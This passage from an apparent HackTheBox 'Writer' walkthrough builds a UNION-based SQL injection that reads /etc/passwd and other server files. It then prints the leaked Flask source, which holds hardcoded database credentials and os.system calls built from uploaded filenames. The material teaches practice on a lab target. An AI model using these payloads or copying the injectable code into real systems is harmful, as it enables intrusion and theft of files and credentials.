<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UNAME<span class="string">&#x27; AND (SELECT 1088 FROM (SELECT(SLEEP(1-(IF(ORD(MID((IFNULL(CAST(HEX(LOAD_FILE(/etc/hostname)) AS NCHAR), )),6,1))&gt;57,0,1)))))ZDPK) AND &#x27;</span>GIYW<span class="string">&#x27;=&#x27;</span>GIYW</span><br></pre></td></tr></table></figure>

<p>so it is still the time based sql injection which can take a lot of time so, we have to think of some other techinique to get the files. One famous and extremly fast technique is using union statement so let’s create the cascade of the main sql query.</p>
<h1 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h1><h2 id="Creating-fast-Working-SQL-query"><a href="#Creating-fast-Working-SQL-query" class="headerlink" title="Creating fast Working SQL query"></a>Creating fast Working SQL query</h2><p>So we know we will use union so we will use something like UNION ALL SELECT and then we know we have to use function readfile to readfiles from remote filesystem.</p>
<p>so that being said let’s create a query.</p>
<h3 id="step-1-gt-terminiating-the-ongoin-query"><a href="#step-1-gt-terminiating-the-ongoin-query" class="headerlink" title="step 1 -&gt; terminiating the ongoin query"></a>step 1 -&gt; terminiating the ongoin query</h3><p>We have to use single quotes to terminate the query.<br>oops ‘</p>
<h3 id="step-2-gt-Using-UNION-statement"><a href="#step-2-gt-Using-UNION-statement" class="headerlink" title="step 2  -&gt; Using UNION statement:"></a>step 2  -&gt; Using UNION statement:</h3><p>UNION ALL SELECT</p>
<h3 id="step-3-gt-Adjusting-No-of-rows"><a href="#step-3-gt-Adjusting-No-of-rows" class="headerlink" title="step 3 -&gt; Adjusting No. of rows."></a>step 3 -&gt; Adjusting No. of rows.</h3><p>This is probably the trickiest step of all the steps.<br>As we know that the table will have at leat two columns uname and password it’s best to start with that. so let’s try that.</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2054.jpg"></li>
</ul>
<p>So looks like our no. of columns is mismatched as we get incorrect credential when we get the no. of colums equal to the no. of colums in table we should be logged in.</p>
<p>Trying for all number of columns we get hit on 6 columns.</p>
<ul>
<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2055.jpg"></p>
</li>
<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2056.jpg"></p>
</li>
</ul>
<p>so now we know the number of columns.</p>
<h3 id="step-4-gt-Which-column-to-inject-so-it-returns-the-output"><a href="#step-4-gt-Which-column-to-inject-so-it-returns-the-output" class="headerlink" title="step 4 -&gt; Which column to inject so it returns the output."></a>step 4 -&gt; Which column to inject so it returns the output.</h3><p>So the answer to this lies in the above photo upon succesfully injecting the query we get the output ‘welcome 1’ so we know the content of column 2 is displayed so we have to inject that column.</p>
<p>0,{SOME SQL CODE},2,3,4,5</p>
<h3 id="step-5-gt-Terminate-the-query"><a href="#step-5-gt-Terminate-the-query" class="headerlink" title="step 5 -&gt; Terminate the query"></a>step 5 -&gt; Terminate the query</h3><p>after you SQL query just terminate the query so it doesn’t spit out the error.</p>
<h2 id="Final-SQL-query"><a href="#Final-SQL-query" class="headerlink" title="Final SQL query"></a>Final SQL query</h2><p>Combining all the above steps to generate the sql query we get something like this.</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">oops<span class="string">&#x27; UNION ALL SELECT 0,LOAD_FILE(&#x27;</span><span class="operator">/</span>etc<span class="operator">/</span>passwd<span class="string">&#x27;),2,3,4,5; --</span></span><br></pre></td></tr></table></figure>

<p>So let’s try that query.<br>And Boom we have fast SQL query to read files.</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2057.jpg"></li>
</ul>
<p>So Now we can try few things we can try and search for passwords for most part we don’t have much on this. [THERE IS THE UNINTENDED WAY BUT WE WILL KEEP DISTANCE FROM IT AS IT’S BASICALLY BRUTEFORCING]</p>
<p>So another thing we could do is just look for the source code of the website and try to find vuln in that.</p>
<p>So let’s see the apache conf file to find the root directory of the installation of apache server.</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2058.jpg"></li>
</ul>
<p>Looks like the root directory is &#x2F;var&#x2F;www&#x2F;writer.htb&#x2F;writer&#x2F; and we have the path to .wsgi file so let’s look at that first. &#x2F;var&#x2F;www&#x2F;writer.htb&#x2F;writer.wsgi</p>
<h3 id="writer-wsgi"><a href="#writer-wsgi" class="headerlink" title="writer.wsgi"></a>writer.wsgi</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Welcome <span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># Define logging</span></span><br><span class="line">logging.basicConfig(stream=sys.stderr)</span><br><span class="line">sys.path.insert(<span class="number">0</span>,&amp;<span class="comment">#34;/var/www/writer.htb/&amp;#34;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Import the __init__.py from the app folder</span></span><br><span class="line"><span class="keyword">from</span> writer <span class="keyword">import</span> app <span class="keyword">as</span> application</span><br><span class="line">application.secret_key = os.environ.get(&amp;<span class="comment">#34;SECRET_KEY&amp;#34;, &amp;#34;&amp;#34;)</span></span><br></pre></td></tr></table></figure>

<p>so we know that it has <strong>init</strong>.py in app folder so let’s hunt for that.<br>You find that file on &#x2F;var&#x2F;www&#x2F;writer.htb&#x2F;writer&#x2F;<strong>init</strong>.py</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2059.jpg"></li>
</ul>
<h3 id="init-py"><a href="#init-py" class="headerlink" title="init.py"></a><strong>init</strong>.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, redirect, url_for, request, render_template</span><br><span class="line"><span class="keyword">from</span> mysql.connector <span class="keyword">import</span> errorcode</span><br><span class="line"><span class="keyword">import</span> mysql.connector</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> PIL</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, UnidentifiedImageError</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">app = Flask(__name__,static_url_path=<span class="string">&#x27;&#x27;</span>,static_folder=<span class="string">&#x27;static&#x27;</span>,template_folder=<span class="string">&#x27;templates&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Define connection for database</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">connections</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">	connector = mysql.connector.connect(user=<span class="string">&#x27;admin&#x27;</span>, password=<span class="string">&#x27;ToughPasswordToCrack&#x27;</span>, host=<span class="string">&#x27;127.0.0.1&#x27;</span>, database=<span class="string">&#x27;writer&#x27;</span>)</span><br><span class="line">	<span class="keyword">return</span> connector</span><br><span class="line">    <span class="keyword">except</span> mysql.connector.Error <span class="keyword">as</span> err:</span><br><span class="line">	<span class="keyword">if</span> err.errno == errorcode.ER_ACCESS_DENIED_ERROR:</span><br><span class="line">	    <span class="keyword">return</span> (<span class="string">&quot;Something is wrong with your db user name or password!&quot;</span>)</span><br><span class="line">	<span class="keyword">elif</span> err.errno == errorcode.ER_BAD_DB_ERROR:</span><br><span class="line">	    <span class="keyword">return</span> (<span class="string">&quot;Database does not exist&quot;</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">	    <span class="keyword">return</span> (<span class="string">&quot;Another exception, returning!&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">	<span class="built_in">print</span> (<span class="string">&#x27;Connection to DB is ready!&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Define homepage</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home_page</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">	connector = connections()</span><br><span class="line">    <span class="keyword">except</span> mysql.connector.Error <span class="keyword">as</span> err:</span><br><span class="line">	    <span class="keyword">return</span> (<span class="string">&quot;Database error&quot;</span>)</span><br><span class="line">    cursor = connector.cursor()</span><br><span class="line">    sql_command = <span class="string">&quot;SELECT * FROM stories;&quot;</span></span><br><span class="line">    cursor.execute(sql_command)</span><br><span class="line">    results = cursor.fetchall()</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;blog/blog.html&#x27;</span>, results=results)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Define about page</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/about&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">about</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;blog/about.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Define contact page</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/contact&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">contact</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;blog/contact.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Define blog posts</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/blog/post/&lt;id&gt;&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">blog_post</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">	connector = connections()</span><br><span class="line">    <span class="keyword">except</span> mysql.connector.Error <span class="keyword">as</span> err:</span><br><span class="line">	    <span class="keyword">return</span> (<span class="string">&quot;Database error&quot;</span>)</span><br><span class="line">    cursor = connector.cursor()</span><br><span class="line">    cursor.execute(<span class="string">&quot;SELECT * FROM stories WHERE id = %(id)s;&quot;</span>, &#123;<span class="string">&#x27;id&#x27;</span>: <span class="built_in">id</span>&#125;)</span><br><span class="line">    results = cursor.fetchall()</span><br><span class="line">    sql_command = <span class="string">&quot;SELECT * FROM stories;&quot;</span></span><br><span class="line">    cursor.execute(sql_command)</span><br><span class="line">    stories = cursor.fetchall()</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;blog/blog-single.html&#x27;</span>, results=results, stories=stories)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Define dashboard for authenticated users</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/dashboard&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dashboard</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (<span class="string">&#x27;user&#x27;</span> <span class="keyword">in</span> session):</span><br><span class="line">	<span class="keyword">return</span> redirect(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;dashboard.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Define stories page for dashboard and edit/delete pages</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/dashboard/stories&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">stories</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (<span class="string">&#x27;user&#x27;</span> <span class="keyword">in</span> session):</span><br><span class="line">	<span class="keyword">return</span> redirect(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">	connector = connections()</span><br><span class="line">    <span class="keyword">except</span> mysql.connector.Error <span class="keyword">as</span> err:</span><br><span class="line">	    <span class="keyword">return</span> (<span class="string">&quot;Database error&quot;</span>)</span><br><span class="line">    cursor = connector.cursor()</span><br><span class="line">    sql_command = <span class="string">&quot;Select * From stories;&quot;</span></span><br><span class="line">    cursor.execute(sql_command)</span><br><span class="line">    results = cursor.fetchall()</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;stories.html&#x27;</span>, results=results)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/dashboard/stories/add&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_story</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (<span class="string">&#x27;user&#x27;</span> <span class="keyword">in</span> session):</span><br><span class="line">	<span class="keyword">return</span> redirect(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">	connector = connections()</span><br><span class="line">    <span class="keyword">except</span> mysql.connector.Error <span class="keyword">as</span> err:</span><br><span class="line">	    <span class="keyword">return</span> (<span class="string">&quot;Database error&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">	<span class="keyword">if</span> request.files[<span class="string">&#x27;image&#x27;</span>]:</span><br><span class="line">	    image = request.files[<span class="string">&#x27;image&#x27;</span>]</span><br><span class="line">	    <span class="keyword">if</span> <span class="string">&quot;.jpg&quot;</span> <span class="keyword">in</span> image.filename:</span><br><span class="line">		path = os.path.join(<span class="string">&#x27;/var/www/writer.htb/writer/static/img/&#x27;</span>, image.filename)</span><br><span class="line">		image.save(path)</span><br><span class="line">		image = <span class="string">&quot;/img/&#123;&#125;&quot;</span>.<span class="built_in">format</span>(image.filename)</span><br><span class="line">	    <span class="keyword">else</span>:</span><br><span class="line">		error = <span class="string">&quot;File extensions must be in .jpg!&quot;</span></span><br><span class="line">		<span class="keyword">return</span> render_template(<span class="string">&#x27;add.html&#x27;</span>, error=error)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> request.form.get(<span class="string">&#x27;image_url&#x27;</span>):</span><br><span class="line">	    image_url = request.form.get(<span class="string">&#x27;image_url&#x27;</span>)</span><br><span class="line">	    <span class="keyword">if</span> <span class="string">&quot;.jpg&quot;</span> <span class="keyword">in</span> image_url:</span><br><span class="line">		<span class="keyword">try</span>:</span><br><span class="line">		    local_filename, headers = urllib.request.urlretrieve(image_url)</span><br><span class="line">		    os.system(<span class="string">&quot;mv &#123;&#125; &#123;&#125;.jpg&quot;</span>.<span class="built_in">format</span>(local_filename, local_filename))</span><br><span class="line">		    image = <span class="string">&quot;&#123;&#125;.jpg&quot;</span>.<span class="built_in">format</span>(local_filename)</span><br><span class="line">		    <span class="keyword">try</span>:</span><br><span class="line">			im = Image.<span class="built_in">open</span>(image) </span><br><span class="line">			im.verify()</span><br><span class="line">			im.close()</span><br><span class="line">			image = image.replace(<span class="string">&#x27;/tmp/&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">			os.system(<span class="string">&quot;mv /tmp/&#123;&#125; /var/www/writer.htb/writer/static/img/&#123;&#125;&quot;</span>.<span class="built_in">format</span>(image, image))</span><br><span class="line">			image = <span class="string">&quot;/img/&#123;&#125;&quot;</span>.<span class="built_in">format</span>(image)</span><br><span class="line">		    <span class="keyword">except</span> PIL.UnidentifiedImageError:</span><br><span class="line">			os.system(<span class="string">&quot;rm &#123;&#125;&quot;</span>.<span class="built_in">format</span>(image))</span><br><span class="line">			error = <span class="string">&quot;Not a valid image file!&quot;</span></span><br><span class="line">			<span class="keyword">return</span> render_template(<span class="string">&#x27;add.html&#x27;</span>, error=error)</span><br><span class="line">		<span class="keyword">except</span>:</span><br><span class="line">		    error = <span class="string">&quot;Issue uploading picture&quot;</span></span><br><span class="line">		    <span class="keyword">return</span> render_template(<span class="string">&#x27;add.html&#x27;</span>, error=error)</span><br><span class="line">	    <span class="keyword">else</span>:</span><br><span class="line">		error = <span class="string">&quot;File extensions must be in .jpg!&quot;</span></span><br><span class="line">		<span class="keyword">return</span> render_template(<span class="string">&#x27;add.html&#x27;</span>, error=error)</span><br><span class="line">	author = request.form.get(<span class="string">&#x27;author&#x27;</span>)</span><br><span class="line">	title = request.form.get(<span class="string">&#x27;title&#x27;</span>)</span><br><span class="line">	tagline = request.form.get(<span class="string">&#x27;tagline&#x27;</span>)</span><br><span class="line">	content = request.form.get(<span class="string">&#x27;content&#x27;</span>)</span><br><span class="line">	cursor = connector.cursor()</span><br><span class="line">	cursor.execute(<span class="string">&quot;INSERT INTO stories VALUES (NULL,%(author)s,%(title)s,%(tagline)s,%(content)s,&#x27;Published&#x27;,now(),%(image)s);&quot;</span>, &#123;<span class="string">&#x27;author&#x27;</span>:author,<span class="string">&#x27;title&#x27;</span>: title,<span class="string">&#x27;tagline&#x27;</span>: tagline,<span class="string">&#x27;content&#x27;</span>: content, <span class="string">&#x27;image&#x27;</span>:image &#125;)</span><br><span class="line">	result = connector.commit()</span><br><span class="line">	<span class="keyword">return</span> redirect(<span class="string">&#x27;/dashboard/stories&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">	<span class="keyword">return</span> render_template(<span class="string">&#x27;add.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/dashboard/stories/edit/&lt;id&gt;&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit_story</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (<span class="string">&#x27;user&#x27;</span> <span class="keyword">in</span> session):</span><br><span class="line">	<span class="keyword">return</span> redirect(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">	connector = connections()</span><br><span class="line">    <span class="keyword">except</span> mysql.connector.Error <span class="keyword">as</span> err:</span><br><span class="line">	    <span class="keyword">return</span> (<span class="string">&quot;Database error&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">	cursor = connector.cursor()</span><br><span class="line">	cursor.execute(<span class="string">&quot;SELECT * FROM stories where id = %(id)s;&quot;</span>, &#123;<span class="string">&#x27;id&#x27;</span>: <span class="built_in">id</span>&#125;)</span><br><span class="line">	results = cursor.fetchall()</span><br><span class="line">	<span class="keyword">if</span> request.files[<span class="string">&#x27;image&#x27;</span>]:</span><br><span class="line">	    image = request.files[<span class="string">&#x27;image&#x27;</span>]</span><br><span class="line">	    <span class="keyword">if</span> <span class="string">&quot;.jpg&quot;</span> <span class="keyword">in</span> image.filename:</span><br><span class="line">		path = os.path.join(<span class="string">&#x27;/var/www/writer.htb/writer/static/img/&#x27;</span>, image.filename)</span><br><span class="line">		image.save(path)</span><br><span class="line">		image = <span class="string">&quot;/img/&#123;&#125;&quot;</span>.<span class="built_in">format</span>(image.filename)</span><br><span class="line">		cursor = connector.cursor()</span><br><span class="line">		cursor.execute(<span class="string">&quot;UPDATE stories SET image = %(image)s WHERE id = %(id)s&quot;</span>, &#123;<span class="string">&#x27;image&#x27;</span>:image, <span class="string">&#x27;id&#x27;</span>:<span class="built_in">id</span>&#125;)</span><br><span class="line">		result = connector.commit()</span><br><span class="line">	    <span class="keyword">else</span>:</span><br><span class="line">		error = <span class="string">&quot;File extensions must be in .jpg!&quot;</span></span><br><span class="line">		<span class="keyword">return</span> render_template(<span class="string">&#x27;edit.html&#x27;</span>, error=error, results=results, <span class="built_in">id</span>=<span class="built_in">id</span>)</span><br><span class="line">	<span class="keyword">if</span> request.form.get(<span class="string">&#x27;image_url&#x27;</span>):</span><br><span class="line">	    image_url = request.form.get(<span class="string">&#x27;image_url&#x27;</span>)</span><br><span class="line">	    <span class="keyword">if</span> <span class="string">&quot;.jpg&quot;</span> <span class="keyword">in</span> image_url:</span><br><span class="line">		<span class="keyword">try</span>:</span><br><span class="line">		    local_filename, headers = urllib.request.urlretrieve(image_url)</span><br><span class="line">		    os.system(<span class="string">&quot;mv &#123;&#125; &#123;&#125;.jpg&quot;</span>.<span class="built_in">format</span>(local_filename, local_filename))</span><br><span class="line">		    image = <span class="string">&quot;&#123;&#125;.jpg&quot;</span>.<span class="built_in">format</span>(local_filename)</span><br><span class="line">		    <span class="keyword">try</span>:</span><br><span class="line">			im = Image.<span class="built_in">open</span>(image) </span><br><span class="line">			im.verify()</span><br><span class="line">			im.close()</span><br><span class="line">			image = image.replace(<span class="string">&#x27;/tmp/&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">			os.system(<span class="string">&quot;mv /tmp/&#123;&#125; /var/www/writer.htb/writer/static/img/&#123;&#125;&quot;</span>.<span class="built_in">format</span>(image, image))</span><br><span class="line">			image = <span class="string">&quot;/img/&#123;&#125;&quot;</span>.<span class="built_in">format</span>(image)</span><br><span class="line">			cursor = connector.cursor()</span><br><span class="line">			cursor.execute(<span class="string">&quot;UPDATE stories SET image = %(image)s WHERE id = %(id)s&quot;</span>, &#123;<span class="string">&#x27;image&#x27;</span>:image, <span class="string">&#x27;id&#x27;</span>:<span class="built_in">id</span>&#125;)</span><br><span class="line">			result = connector.commit()</span><br><span class="line"></span><br><span class="line">		    <span class="keyword">except</span> PIL.UnidentifiedImageError:</span><br><span class="line">			os.system(<span class="string">&quot;rm &#123;&#125;&quot;</span>.<span class="built_in">format</span>(image))</span><br><span class="line">			error = <span class="string">&quot;Not a valid image file!&quot;</span></span><br><span class="line">			<span class="keyword">return</span> render_template(<span class="string">&#x27;edit.html&#x27;</span>, error=error, results=results, <span class="built_in">id</span>=<span class="built_in">id</span>)</span><br><span class="line">		<span class="keyword">except</span>:</span><br><span class="line">		    error = <span class="string">&quot;Issue uploading picture&quot;</span></span><br><span class="line">		    <span class="keyword">return</span> render_template(<span class="string">&#x27;edit.html&#x27;</span>, error=error, results=results, <span class="built_in">id</span>=<span class="built_in">id</span>)</span><br><span class="line">	    <span class="keyword">else</span>:</span><br><span class="line">		error = <span class="string">&quot;File extensions must be in .jpg!&quot;</span></span><br><span class="line">		<span class="keyword">return</span> render_template(<span class="string">&#x27;edit.html&#x27;</span>, error=error, results=results, <span class="built_in">id</span>=<span class="built_in">id</span>)</span><br><span class="line">	title = request.form.get(<span class="string">&#x27;title&#x27;</span>)</span><br><span class="line">	tagline = request.form.get(<span 